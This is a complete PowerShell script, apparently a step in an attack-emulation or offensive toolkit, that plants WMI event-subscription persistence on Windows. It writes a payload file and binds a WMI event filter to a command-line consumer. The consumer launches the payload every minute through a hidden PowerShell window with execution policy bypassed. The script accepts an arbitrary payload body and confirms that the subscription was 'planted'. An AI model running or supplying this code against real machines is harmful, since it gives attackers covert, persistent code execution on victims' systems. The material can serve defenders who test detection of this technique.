script:
if (-not $FILTER_NAME -or -not $CONSUMER_NAME -or -not $PAYLOAD_PATH) { throw 'FILTER_NAME, CONSUMER_NAME and PAYLOAD_PATH are required' }
$dir = Split-Path $PAYLOAD_PATH -Parent
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$body = if ($PAYLOAD_BODY) { $PAYLOAD_BODY } else { 'while ($true) { Start-Sleep -Seconds 300 }' }
Set-Content -Path $PAYLOAD_PATH -Value $body -Encoding ascii
$cmdline = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PAYLOAD_PATH`""
$wql = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
Get-WmiObject -Namespace 'root\subscription' -Class __FilterToConsumerBinding -ErrorAction Ignore | Where-Object { $_.Filter -like "*$FILTER_NAME*" } | ForEach-Object { $_.Delete() }
Get-CimInstance -Namespace 'root\subscription' -ClassName __EventFilter -ErrorAction Ignore | Where-Object Name -eq $FILTER_NAME | Remove-CimInstance -ErrorAction Ignore
Get-CimInstance -Namespace 'root\subscription' -ClassName CommandLineEventConsumer -ErrorAction Ignore | Where-Object Name -eq $CONSUMER_NAME | Remove-CimInstance -ErrorAction Ignore
$f = Set-WmiInstance -Namespace 'root\subscription' -Class __EventFilter -Arguments @{ Name = $FILTER_NAME; EventNamespace = 'root\subscription'; QueryLanguage = 'WQL'; Query = $wql }
$c = Set-WmiInstance -Namespace 'root\subscription' -Class CommandLineEventConsumer -Arguments @{ Name = $CONSUMER_NAME; CommandLineTemplate = $cmdline }
Set-WmiInstance -Namespace 'root\subscription' -Class __FilterToConsumerBinding -Arguments @{ Filter = $f; Consumer = $c } | Out-Null
Write-Output 'WMI subscription planted'
